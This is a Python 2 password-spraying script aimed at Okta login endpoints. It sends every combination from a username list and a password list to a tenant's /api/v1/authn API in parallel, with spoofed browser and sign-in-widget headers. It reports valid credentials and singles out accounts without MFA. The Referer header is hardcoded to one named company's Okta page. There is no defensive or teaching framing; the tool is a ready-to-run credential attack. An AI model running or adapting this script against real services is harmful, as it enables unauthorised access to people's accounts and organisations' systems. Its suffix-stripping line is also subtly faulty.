import requests
import multiprocessing
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("subdomain", help="The subdomain of okta.com to attempt the spray upon.")
parser.add_argument("userList", help="The newline delimited list of users to password spray")
parser.add_argument("passList", help="The newline delimited list of passwords to spray.")
parser.add_argument("--threads", help="Number of threads. Default: 7", default=7, type=int)
args = parser.parse_args()

subdomain = args.subdomain.strip(".okta.com")

def checkCreds(creds):
    username, password = creds
    session = requests.Session()
    rawBody = "{\"username\":\"%s\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true},\"password\":\"%s\"}" % (username, password)
    headers = {"Accept":"application/json","X-Requested-With":"XMLHttpRequest","X-Okta-User-Agent-Extended":"okta-signin-widget-2.12.0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0","Referer":"https://magellanhealth.okta.com/","Accept-Encoding":"gzip, deflate","Accept-Language":"en","Content-Type":"application/json"}
    response = session.post("https://%s.okta.com/api/v1/authn"%subdomain, data=rawBody, headers=headers)
    if response.status_code == 200 and 'status' in response.json():
        if "MFA_ENROLL" == response.json()['status']:
            print "Valid Credentials without MFA! %s:%s"%(username, password)
        else:
            print "Valid Credentials! %s:%s"%(username, password)
        

uL=open(args.userList)
users = map(str.strip, uL.readlines())
uL.close()

pL=open(args.passList)
passwords = map(str.strip, pL.readlines())
pL.close()

combo = []
for password in passwords:
    for user in users:
        combo.append([user, password])

del users
del passwords


pool = multiprocessing.Pool(args.threads)
pool.map(checkCreds, combo)
